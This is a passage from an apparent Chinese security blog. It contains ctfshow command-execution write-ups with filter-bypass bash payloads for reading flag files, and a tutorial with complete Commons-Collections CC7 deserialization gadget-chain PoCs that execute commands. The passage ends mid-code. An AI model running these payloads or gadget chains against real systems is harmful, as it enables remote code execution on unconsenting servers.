/var/www/html\nnl: /var/www/html: Is a directory\n```\n\n可以执行，那我们就打\n\n```php\n${PATH:~A}${PWD:~A} ????.???\n```\n\nflag在源码中\n\n## web119\n\n一样的界面，不过PATH被过滤了，试试别的环境变量\n\n![image-20250317164620779](../image/achieve/202411/命令执行--ctfshow/image-20250317164620779.png)\n\n那我们进行构造\n\n使用/bin/cat\n\n```php\n/???/?a? ????.???\npayload：\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???\n\n/???/??t ????.???\n${PWD::${#SHLVL}}\t->\t/\n${USER:~${#SHLVL}:${#SHLVL}}\t->\tt\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${USER:~${#SHLVL}:${#SHLVL}} ????.???\n    \n构造/bin/base64 flag.php\n/???/?????4 ????.???\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\n```\n\n然后flag在源码中\n\n## web120\n\n```php\n\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_POST['code'])){\n    $code=$_POST['code'];\n    if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\<|\\>|\\'|\\\"|\\`|\\||\\,/', $code)){    \n        if(strlen($code)>65){\n            echo '<div align=\"center\">'.'you are so long , I dont like '.'</div>';\n        }\n        else{\n        echo '<div align=\"center\">'.system($code).'</div>';\n        }\n    }\n    else{\n     echo '<div align=\"center\">evil input</div>';\n    }\n}\n\n?>\n```\n\n过滤的有点多，用脚本输出一下可以用的字符\n\n```php\n # $ . : ; ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z _ { } ~ \n```\n\n还是和上面的一样，得用环境变量去打\n\n上面第一个payload的长度刚刚好没超过\n\n```php\ncode=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???\n```\n\n然后flag在源码中直接搜就行\n\n## web121\n\n```php\n\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_POST['code'])){\n    $code=$_POST['code'];\n    if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\<|\\>|\\'|\\\"|\\`|\\||\\,/', $code)){    \n        if(strlen($code)>65){\n            echo '<div align=\"center\">'.'you are so long , I dont like '.'</div>';\n        }\n        else{\n        echo '<div align=\"center\">'.system($code).'</div>';\n        }\n    }\n    else{\n     echo '<div align=\"center\">evil input</div>';\n    }\n}\n\n?>\n```\n\n可用字符\n\n```php\n# $ . : ; ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z { } \n```\n\n过滤了SHLVL，但是可以用其他的表示1\n\n```php\n构造/bin/base64 flag.php\n/???/?????4 ????.???\n${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???\n```\n\n但是这里的话RANDOM是随机的，但是大多数能出现4和5，所以多发几次包就行\n\n## web122\n\n```php\n\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_POST['code'])){\n    $code=$_POST['code'];\n    if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|#|%|\\>|\\'|\\\"|\\`|\\||\\,/', $code)){    \n        if(strlen($code)>65){\n            echo '<div align=\"center\">'.'you are so long , I dont like '.'</div>';\n        }\n        else{\n        echo '<div align=\"center\">'.system($code).'</div>';\n        }\n    }\n    else{\n     echo '<div align=\"center\">evil input</div>';\n    }\n}\n\n?>\n```\n\n可用字符\n\n```php\n$ . : ; < ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z { } \n```\n\n这次还过滤了`#`和`PWD`，看了其他的环境变量发现HOME还没被过滤，用来返回当前用户的主目录路径。不管怎么样第一个都是`/`，那就可以拿第三个payload去打，但是我们需要解决一个如何构造数字的问题。我们需要数字`1`和`4`。\n\n们可以利用`$?`，获取上一条命令执行结束后的返回值，`0`代表成功，`非0`代表失败。\n\n```php\nubuntu@VM-16-12-ubuntu:/var/www/html$ echo 1\n1\nubuntu@VM-16-12-ubuntu:/var/www/html$ echo $?\n0\nubuntu@VM-16-12-ubuntu:/var/www/html$ lss\nCommand 'lss' not found, but there are 15 similar ones.\nubuntu@VM-16-12-ubuntu:/var/www/html$ echo $?\n127\n```\n\n但是这里仍然不是1，这时候该怎么构造呢？\n\n我们看看错误代码的非0返回值结果\n\n```php\n\"OS error code   1:  Operation not permitted\"\n\"OS error code   2:  No such file or directory\"\n\"OS error code   3:  No such process\"\n\"OS error code   4:  Interrupted system call\"\n\"OS error code   5:  Input/output error\"\n\"OS error code   6:  No such device or address\"\n\"OS error code   7:  Argument list too long\"\n\"OS error code   8:  Exec format error\"\n\"OS error code   9:  Bad file descriptor\"\n\"OS error code  10:  No child processes\"\n\"OS error code  11:  Resource temporarily unavailable\"\n\"OS error code  12:  Cannot allocate memory\"\n\"OS error code  13:  Permission denied\"\n\"OS error code  14:  Bad address\"\n\"OS error code  15:  Block device required\"\n\"OS error code  16:  Device or resource busy\"\n\"OS error code  17:  File exists\"\n\"OS error code  18:  Invalid cross-device link\"\n\"OS error code  19:  No such device\"\n\"OS error code  20:  Not a directory\"\n\"OS error code  21:  Is a directory\"\n\"OS error code  22:  Invalid argument\"\n\"OS error code  23:  Too many open files in system\"\n\"OS error code  24:  Too many open files\"\n\"OS error code  25:  Inappropriate ioctl for device\"\n\"OS error code  26:  Text file busy\"\n\"OS error code  27:  File too large\"\n\"OS error code  28:  No space left on device\"\n\"OS error code  29:  Illegal seek\"\n\"OS error code  30:  Read-only file system\"\n\"OS error code  31:  Too many links\"\n\"OS error code  32:  Broken pipe\"\n\"OS error code  33:  Numerical argument out of domain\"\n\"OS error code  34:  Numerical result out of range\"\n\"OS error code  35:  Resource deadlock avoided\"\n\"OS error code  36:  File name too long\"\n\"OS error code  37:  No locks available\"\n\"OS error code  38:  Function not implemented\"\n\"OS error code  39:  Directory not empty\"\n\"OS error code  40:  Too many levels of symbolic links\"\n\"OS error code  42:  No message of desired type\"\n\"OS error code  43:  Identifier removed\"\n\"OS error code  44:  Channel number out of range\"\n\"OS error code  45:  Level 2 not synchronized\"\n\"OS error code  46:  Level 3 halted\"\n\"OS error code  47:  Level 3 reset\"\n\"OS error code  48:  Link number out of range\"\n\"OS error code  49:  Protocol driver not attached\"\n\"OS error code  50:  No CSI structure available\"\n\"OS error code  51:  Level 2 halted\"\n\"OS error code  52:  Invalid exchange\"\n\"OS error code  53:  Invalid request descriptor\"\n\"OS error code  54:  Exchange full\"\n\"OS error code  55:  No anode\"\n\"OS error code  56:  Invalid request code\"\n\"OS error code  57:  Invalid slot\"\n\"OS error code  59:  Bad font file format\"\n\"OS error code  60:  Device not a stream\"\n\"OS error code  61:  No data available\"\n\"OS error code  62:  Timer expired\"\n\"OS error code  63:  Out of streams resources\"\n\"OS error code  64:  Machine is not on the network\"\n\"OS error code  65:  Package not installed\"\n\"OS error code  66:  Object is remote\"\n\"OS error code  67:  Link has been severed\"\n\"OS error code  68:  Advertise error\"\n\"OS error code  69:  Srmount error\"\n\"OS error code  70:  Communication error on send\"\n\"OS error code  71:  Protocol error\"\n\"OS error code  72:  Multihop attempted\"\n\"OS error code  73:  RFS specific error\"\n\"OS error code  74:  Bad message\"\n\"OS error code  75:  Value too large for defined data type\"\n\"OS error code  76:  Name not unique on network\"\n\"OS error code  77:  File descriptor in bad state\"\n\"OS error code  78:  Remote address changed\"\n\"OS error code  79:  Can not access a needed shared library\"\n\"OS error code  80:  Accessing a corrupted shared library\"\n\"OS error code  81:  .lib section in a.out corrupted\"\n\"OS error code  82:  Attempting to link in too many shared libraries\"\n\"OS error code  83:  Cannot exec a shared library directly\"\n\"OS error code  84:  Invalid or incomplete multibyte or wide character\"\n\"OS error code  85:  Interrupted system call should be restarted\"\n\"OS error code  86:  Streams pipe error\"\n\"OS error code  87:  Too many users\"\n\"OS error code  88:  Socket operation on non-socket\"\n\"OS error code  89:  Destination address required\"\n\"OS error code  90:  Message too long\"\n\"OS error code  91:  Protocol wrong type for socket\"\n\"OS error code  92:  Protocol not available\"\n\"OS error code  93:  Protocol not supported\"\n\"OS error code  94:  Socket type not supported\"\n\"OS error code  95:  Operation not supported\"\n\"OS error code  96:  Protocol family not supported\"\n\"OS error code  97:  Address family not supported by protocol\"\n\"OS error code  98:  Address already in use\"\n\"OS error code  99:  Cannot assign requested address\"\n\"OS error code 100:  Network is down\"\n\"OS error code 101:  Network is unreachable\"\n\"OS error code 102:  Network dropped connection on reset\"\n\"OS error code 103:  Software caused connection abort\"\n\"OS error code 104:  Connection reset by peer\"\n\"OS error code 105:  No buffer space available\"\n\"OS error code 106:  Transport endpoint is already connected\"\n\"OS error code 107:  Transport endpoint is not connected\"\n\"OS error code 108:  Cannot send after transport endpoint shutdown\"\n\"OS error code 109:  Too many references: cannot splice\"\n\"OS error code 110:  Connection timed out\"\n\"OS error code 111:  Connection refused\"\n\"OS error code 112:  Host is down\"\n\"OS error code 113:  No route to host\"\n\"OS error code 114:  Operation already in progress\"\n\"OS error code 115:  Operation now in progress\"\n\"OS error code 116:  Stale NFS file handle\"\n\"OS error code 117:  Structure needs cleaning\"\n\"OS error code 118:  Not a XENIX named type file\"\n\"OS error code 119:  No XENIX semaphores available\"\n\"OS error code 120:  Is a named type file\"\n\"OS error code 121:  Remote I/O error\"\n\"OS error code 122:  Disk quota exceeded\"\n\"OS error code 123:  No medium found\"\n\"OS error code 124:  Wrong medium type\"\n\"OS error code 125:  Operation canceled\"\n\"OS error code 126:  Required key not available\"\n\"OS error code 127:  Key has expired\"\n\"OS error code 128:  Key has been revoked\"\n\"OS error code 129:  Key was rejected by service\"\n\"OS error code 130:  Owner died\"\n\"OS error code 131:  State not recoverable\"\n\"MySQL error code 132: Old database file\"\n\"MySQL error code 133: No record read before update\"\n\"MySQL error code 134: Record was already deleted (or record file crashed)\"\n\"MySQL error code 135: No more room in record file\"\n\"MySQL error code 136: No more room in index file\"\n\"MySQL error code 137: No more records (read after end of file)\"\n\"MySQL error code 138: Unsupported extension used for table\"\n\"MySQL error code 139: Too big row\"\n\"MySQL error code 140: Wrong create options\"\n\"MySQL error code 141: Duplicate unique key or constraint on write or update\"\n\"MySQL error code 142: Unknown character set used\"\n\"MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table\"\n\"MySQL error code 144: Table is crashed and last repair failed\"\n\"MySQL error code 145: Table was marked as crashed and should be repaired\"\n\"MySQL error code 146: Lock timed out; Retry transaction\"\n\"MySQL error code 147: Lock table is full;  Restart program with a larger locktable\"\n\"MySQL error code 148: Updates are not allowed under a read only transactions\"\n\"MySQL error code 149: Lock deadlock; Retry transaction\"\n\"MySQL error code 150: Foreign key constraint is incorrectly formed\"\n\"MySQL error code 151: Cannot add a child row\"\n\"MySQL error code 152: Cannot delete a parent row\"\n```\n\n我们关注能返回1的命令就行，其实就是权限问题，但是很多权限的命令都是有字母的，然后看到了一个<A是可以返回1的\n\n```php\nubuntu@VM-16-12-ubuntu:/var/www/html$ <A\n-bash: A: No such file or directory\nubuntu@VM-16-12-ubuntu:/var/www/html$ echo $?\n1\n```\n\n那我们就可以构造\n\n```php\ncode=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???\ncode=<A;${HOME:${Z}:$?}???${HOME:${Z}:$?}?????${RANDOM::$?} ????.???\n```\n\n这里的话`${Z}`表示0\n\n需要多刷新几次，这次做的时候我就刷新了好多次才刷出来\n\n## web124\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: 收集自网络\n# @Date:   2020-09-16 11:25:09\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-10-06 14:04:45\n\n*/\n\nerror_reporting(0);\n//听说你很喜欢数学，不知道你是否爱它胜过爱flag\nif(!isset($_GET['c'])){\n    show_source(__FILE__);\n}else{\n    //例子 c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) >= 80) {\n        die(\"太长了不会算\");\n    }\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) {\n        if (preg_match('/' . $blackitem . '/m', $content)) {\n            die(\"请不要输入奇奇怪怪的字符\");\n        }\n    }\n    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \n    foreach ($used_funcs[0] as $func) {\n        if (!in_array($func, $whitelist)) {\n            die(\"请不要输入奇奇怪怪的函数\");\n        }\n    }\n    //帮你算出答案\n    eval('echo '.$content.';');\n}\n```\n\n","tags":["命令执行"],"categories":["ctfshow"]},{"title":"Java反序列化CC7链","url":"/2025/06/28/Java反序列化CC7链/","content":"\nhttps://infernity.top/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/\n\n## 0x01链子分析\n\n和CC5一样，改变了CC1的开头，但LaztMap#get()后半段是一样的\n\n## 0x02版本\n\njdk：jdk8u65\nCC：Commons-Collections 3.2.1\n\n## 0x03链子寻找\n\n那我们找一下能调用get的方法\n\n### AbstractMap#equals\n\n在AbstractMap#equals中\n\n```java\n    public boolean equals(Object o) {\n        if (o == this)\n            return true;\n\n        if (!(o instanceof Map))\n            return false;\n        Map<?,?> m = (Map<?,?>) o;\n        if (m.size() != size())\n            return false;\n\n        try {\n            Iterator<Entry<K,V>> i = entrySet().iterator();\n            while (i.hasNext()) {\n                Entry<K,V> e = i.next();\n                K key = e.getKey();\n                V value = e.getValue();\n                if (value == null) {\n                    if (!(m.get(key)==null && m.containsKey(key)))\n                        return false;\n                } else {\n                    if (!value.equals(m.get(key)))\t//调用get方法\n                        return false;\n                }\n            }\n        } catch (ClassCastException unused) {\n            return false;\n        } catch (NullPointerException unused) {\n            return false;\n        }\n\n        return true;\n    }\n```\n\nm.get()调用了get方法\n\n### Hashtable#reconstitutionPut()\n\n在Hashtable类的reconstitutionPut中调用了equals方法\n\n```java\n    private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)\n        throws StreamCorruptedException\n    {\n        if (value == null) {\n            throw new java.io.StreamCorruptedException();\n        }\n        // Makes sure the key is not already in the hashtable.\n        // This should not happen in deserialized version.\n        int hash = key.hashCode();\n        int index = (hash & 0x7FFFFFFF) % tab.length;\n        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {\n            if ((e.hash == hash) && e.key.equals(key)) {\t//调用equals方法\n                throw new java.io.StreamCorruptedException();\n            }\n        }\n        // Creates the new entry.\n        @SuppressWarnings(\"unchecked\")\n            Entry<K,V> e = (Entry<K,V>)tab[index];\n        tab[index] = new Entry<>(hash, key, value, e);\n        count++;\n    }\n```\n\n### Hashtable#readObject()\n\n在本类的readObject()方法中发现调用了reconstitutionPut方法\n\n```java\n    private void readObject(java.io.ObjectInputStream s)\n         throws IOException, ClassNotFoundException\n    {\n        // Read in the length, threshold, and loadfactor\n        s.defaultReadObject();\n\n        // Read the original length of the array and number of elements\n        int origlength = s.readInt();\n        int elements = s.readInt();\n\n        // Compute new size with a bit of room 5% to grow but\n        // no larger than the original size.  Make the length\n        // odd if it's large enough, this helps distribute the entries.\n        // Guard against the length ending up zero, that's not valid.\n        int length = (int)(elements * loadFactor) + (elements / 20) + 3;\n        if (length > elements && (length & 1) == 0)\n            length--;\n        if (origlength > 0 && length > origlength)\n            length = origlength;\n        table = new Entry<?,?>[length];\n        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);\n        count = 0;\n\n        // Read the number of elements and then all the key/value objects\n        for (; elements > 0; elements--) {\n            @SuppressWarnings(\"unchecked\")\n                K key = (K)s.readObject();\n            @SuppressWarnings(\"unchecked\")\n                V value = (V)s.readObject();\n            // synch could be eliminated for performance\n            reconstitutionPut(table, key, value);\n        }\n    }\n```\n\n## 0x04POC编写\n\n我们先看一下equals方法\n\n```java\n    public boolean equals(Object o) {\n        \n        //判断是否为同一对象\n        if (o == this)\n            return true;\n        \n        //判断运行类型是否不是map\n        if (!(o instanceof Map))\n            return false;\n        Map<?,?> m = (Map<?,?>) o;\n        \n        //判断HashMap的元素的个数size\n        if (m.size() != size())\n            return false;\n\n        try {\n            Iterator<Entry<K,V>> i = entrySet().iterator();\n            while (i.hasNext()) {\n                Entry<K,V> e = i.next();\n                K key = e.getKey();\n                V value = e.getValue();\n                \n                //判断如果value为null，则判断key\n                if (value == null) {\n                    if (!(m.get(key)==null && m.containsKey(key)))\n                        return false;\n                } else {\n                    //如果value不为null，判断value内容是否相同\n                    if (!value.equals(m.get(key)))\n                        return false;\n                }\n            }\n        } catch (ClassCastException unused) {\n            return false;\n        } catch (NullPointerException unused) {\n            return false;\n        }\n\n        return true;\n    }\n```\n\n如果要进入get方法的话需要先经过三个if语句的判断\n\n```java\nif (o == this)\t//判断o是否为对象本身\n    return true;\n\nif (!(o instanceof Map))\t//判断类型是否是Map类型\n    return false;\nMap<?,?> m = (Map<?,?>) o;\t//将对象 o 强制转换为泛型类型为未知类型的 Map\nif (m.size() != size())\t//判断Map的元素的个数size\n    return false;\n```\n\n往后看可以发现，当以上三个判断都不满足的情况下，则进一步判断Map中的元素，也就是判断元素的key和value的内容是否相同，在value不为null的情况下，m会调用get方法获取key的内容。虽然对象o强制成Map类型，但是m对象本质上是一个LazyMap。因此m对象调用get方法时实际上是调用了LazyMap的get方法。\n\n我们看看readObject方法\n\n```java\nprivate void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {\n    // Read in the length, threshold, and loadfactor\n    s.defaultReadObject();\n\n    // 读取table数组的容量\n    int origlength = s.readInt();\n    //读取table数组的元素个数\n    int elements = s.readInt();\n\n    //计算table数组的length\n    int length = (int)(elements * loadFactor) + (elements / 20) + 3;\n    if (length > elements && (length & 1) == 0)\n        length--;\n    if (origlength > 0 && length > origlength)\n        length = origlength;\n    //根据length创建table数组\n    table = new Entry<?,?>[length];\n    threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);\n    count = 0;\n\n    //反序列化，还原table数组\n    for (; elements > 0; elements--) {\n        @SuppressWarnings(\"unchecked\")\n            K key = (K)s.readObject();\n        @SuppressWarnings(\"unchecked\")\n            V value = (V)s.readObject();\n        reconstitutionPut(table, key, value);\n    }\n}\n```\n\n貌似没什么需要注意的\n\n再来看看reconstitutionPut方法\n\n```java\nprivate void reconstitutionPut(Entry<?,?>[] tab, K key, V value) throws StreamCorruptedException {\n\t//value不能为null\n       if (value == null) {\n           throw new java.io.StreamCorruptedException();\n       }\n\n\t//重新计算key的hash值\n       int hash = key.hashCode();\n\t//根据hash值计算存储索引\n       int index = (hash & 0x7FFFFFFF) % tab.length;\n\t//判断元素的key是否重复\n       for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {\n\t\t//如果key重复则抛出异常\n           if ((e.hash == hash) && e.key.equals(key)) {\n               throw new java.io.StreamCorruptedException();\n           }\n       }\n       //key不重复则将元素添加到table数组中\n       @SuppressWarnings(\"unchecked\")\n           Entry<K,V> e = (Entry<K,V>)tab[index];\n       tab[index] = new Entry<>(hash, key, value, e);\n       count++;\n   }\n```\n\nreconstitutionPut方法首先对value进行不为null的校验，否则抛出反序列化异常\n\n然后根据key计算出元素在table数组中的存储索引，判断元素在table数组中是否重复，这里的话会调用equals方法\n\nCC7利用链的漏洞触发的关键就在reconstitutionPut方法中，该方法在判断重复元素的时候校验了两个元素的hash值是否一样，然后接着key会调用equals方法判断key是否重复时就会触发漏洞。\n\n所以我们不难看出，在Hashtable中的元素至少为2个并且元素的hash值也必须相同的情况下才会调用equals方法，否则不会触发漏洞。\n\n那么我们就需要创建两个Map对象\n\n```java\n        HashMap hashMap1 = new HashMap();\n        HashMap hashMap2 = new HashMap();\n\n        Map LazyMap1=LazyMap.decorate(hashMap1,chainedTransformer);\n        LazyMap1.put(\"aa\",1);\n        Map LazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);\n        LazyMap2.put(\"bb\",1);\n\n        Hashtable hashtable = new Hashtable();\n        hashtable.put(LazyMap1,1);\n        hashtable.put(LazyMap2,1);\n```\n\n这里需要注意一个点，那就是在反序列化时，reconstitutionPut方法中的if判断中两个元素的hash值必须相同的情况下，才会调用eauals方法。\n\ninfer师傅这里给出两组hash相同的值：\n\n```\nyy与zZ\nEa与FB\n```\n\n我们写个POC\n\n```java\n        HashMap hashMap1 = new HashMap();\n        HashMap hashMap2 = new HashMap();\n\n        Map LazyMap1=LazyMap.decorate(hashMap1,chainedTransformer);\n        LazyMap1.put(\"zZ\",1);\n        Map LazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);\n        LazyMap2.put(\"yy\",1);\n\n        Hashtable hashtable = new Hashtable();\n        hashtable.put(LazyMap1,1);\n        hashtable.put(LazyMap2,1);\n```\n\n在**hashtable.put(LazyMap2,1)处**打断点调试一下\n\n![image-20250628205242920](../image/achieve/202411/java学习/image-20250628205242920.png)\n\n此时的key是lazyMap2对象，而lazyMap2实际上调用了AbstractMap抽象类的equals方法，equals方法内部会调用lazyMap2的get方法判断table数组中元素的key在lazyMap2是否已存在，如果不存在，transform会把当前传入的key返回作为value，然后lazyMap2会调用put方法把key和value（yy=yy）添加到lazyMap2。\n\n```java\n    public Object get(Object key) {\n        // create value for key if key is not currently in the map\n        if (map.containsKey(key) == false) {\n            Object value = factory.transform(key);\n            map.put(key, value);\n            return value;\n        }\n        return map.get(key);\n    }\n```\n\n![image-20250628210247794](../image/achieve/202411/java学习/image-20250628210247794.png)\n\n当在反序列化时，reconstitutionPut方法在还原table数组时会调用equals方法判断重复元素，由于AbstractMap抽象类的equals方法校验的时候更为严格，会判断Map中元素的个数，由于lazyMap2和lazyMap1中的元素个数不一样则直接返回false，那么也就不会触发漏洞。\n\n因此在构造CC7利用链的payload代码时，Hashtable在添加第二个元素后，lazyMap2需要调用remove方法删除元素yy才能触发漏洞。\n\n```java\nlazyMap2.remove(\"yy\");\n```\n\n所以我们最终的POC是\n\n### POC\n\n```java\npackage POC.CC7;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.util.AbstractMap;\nimport java.util.HashMap;\nimport java.util.Hashtable;\nimport java.util.Map;\n\npublic class CC7 {\n    public static void main(String[] args) throws Exception {\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}),\n                new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        };\n        ChainedTransformer chainedTransformer =  new ChainedTransformer(transformers);\n\n        //CC7链的开始\n        HashMap hashMap1 = new HashMap();\n        HashMap hashMap2 = new HashMap();\n\n        Map LazyMap1=LazyMap.decorate(hashMap1,chainedTransformer);\n        LazyMap1.put(\"yy\",1);\n        Map LazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);\n        LazyMap2.put(\"zZ\",1);\n\n        Hashtable hashtable = new Hashtable();\n        hashtable.put(LazyMap1,1);\n        hashtable.put(LazyMap2,1);\n        LazyMap2.remove(\"yy\");\n\n        serialize(hashtable);\n        unserialize(\"CC7.txt\");\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC7.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n\n```\n\n但是这里往往在利用的时候例如我们需要生成反弹shell的序列化字符串的时候，往往会因为put方法的提前触发而导致后面进行base64编码无法进行，所以还是用之前的方法，先放一个空的Transformer，再换回去\n\n```java\npackage SerializeChains.CCchains.CC7;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.functors.ChainedTransformer;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.AbstractMap;\nimport java.util.HashMap;\nimport java.util.Hashtable;\nimport java.util.Map;\n\npublic class CC7 {\n    public static void main(String[] args) throws Exception {\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}),\n                new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        };\n        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});\n\n        //CC7链的开始\n        //使用Hashtable来构造利用链调用LazyMap\n        Map hashMap1 = new HashMap();\n        Map hashMap2 = new HashMap();\n        Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);\n        lazyMap1.put(\"yy\", 1);\n        Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);\n        lazyMap2.put(\"zZ\", 1);\n\n        Hashtable hashtable = new Hashtable();\n        hashtable.put(lazyMap1, 1);\n        hashtable.put(lazyMap2, 1);\n\n        //输出两个元素的hash值\n        System.out.println(\"lazyMap1 hashcode:\" + lazyMap1.hashCode());\n        System.out.println(\"lazyMap2 hashcode:\" + lazyMap2.hashCode());\n\n\n        //iTransformers = transformers（反射）\n        Field iTransformers = ChainedTransformer.class.getDeclaredField(\"iTransformers\");\n        iTransformers.setAccessible(true);\n        iTransformers.set(transformerChain, transformers);\n\n        lazyMap2.remove(\"yy\");\n        serialize(hashtable);\n        unserialize(\"CC7.txt\");\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC7.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n```\n\n\n\n## 0x05补充链\n\n后面做题的时候又发现一条野生链，\n\n```\nHashtable#readObject() 触发 DefaultedMap#equals() → 调用 transformer\n```\n\n先给poc，后面再补充上\n\n### POC2\n\n```java\npackage SerializeChains.CCchains.CC7;\n\n\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\nimport org.apache.commons.collections4.map.DefaultedMap;\n\nimport java.io.*;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Hashtable;\nimport java.util.Map;\n\npublic class CC7plus {\n    /*\n     * Hashtable#readObject() 触发 DefaultedMap#equals() → 调用 transformer，适用于commons-collections4\n     * */\n    public static void main(String[] args) throws Exception {\n        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});\n        Transformer[] transformers=new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}),\n                new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        };\n\n        //CC7链的开始\n        Map hashMap1 = new HashMap();\n        Map hashMap2 = new HashMap();\n        Class<DefaultedMap> d = DefaultedMap.class;\n        Constructor<DefaultedMap> declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class);\n        declaredConstructor.setAccessible(true);\n        DefaultedMap defaultedMap1 = declaredConstructor.newInstance(hashMap1, transformerChain);\n        DefaultedMap defaultedMap2 = declaredConstructor.newInstance(hashMap2, transformerChain);\n        defaultedMap1.put(\"yy\", 1);\n        